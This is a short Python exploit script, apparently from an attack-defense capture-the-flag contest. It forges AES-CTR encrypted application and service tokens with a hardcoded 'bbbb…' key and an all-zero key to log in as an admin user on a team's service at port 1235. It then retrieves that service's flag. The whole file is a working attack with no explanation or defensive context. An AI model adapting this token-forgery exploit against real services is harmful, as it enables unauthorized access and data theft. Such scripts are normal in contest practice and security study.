#!/usr/bin/env python3

from pwn import *
from Crypto.Cipher import AES
import json
import sys
import os
import time

context.log_level = "error"


def exploit(ip, flag_id):
    APP_KEY = b"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
    admin_name = flag_id.encode()

    app_token = json.dumps({"ts": str(int(time.time())), "type": "APP_TOKEN",
                            "user": admin_name.hex(), "key": "0", "service": "0", "tag": "0"*64})
    service_token = json.dumps({"ts": str(int(time.time())), "type": "SERVICE_TOKEN",
                                "user": admin_name.hex(), "key": "0"*64, "service": "0", "tag": "0"*64})
    iv_app = os.urandom(16)
    iv_service = os.urandom(16)
    cipher = AES.new(APP_KEY, AES.MODE_CTR,
                     nonce=iv_service[:8], initial_value=iv_service[8:16])
    service_token = cipher.encrypt(service_token.encode())
    cipher = AES.new(b"\x00"*32, AES.MODE_CTR,
                     nonce=iv_app[:8], initial_value=iv_app[8:16])
    app_token = cipher.encrypt(app_token.encode())

    r = remote(ip, 1235)

    r.recvuntil(": ")

    r.sendline((iv_app+app_token).hex() + "." +
               (iv_service+service_token).hex())

    r.recvuntil("Exit\n")
    r.sendline("3")
    r.recvuntil(": ")
    r.sendline("0")
    r.recvline()
    return r.recvline(False).split()[-1].decode()


if __name__ == "__main__":
    team_id = sys.argv[1]
    flag_id = sys.argv[2]
    ip = f"10.60.{team_id}.1"
    print(exploit(ip, flag_id))
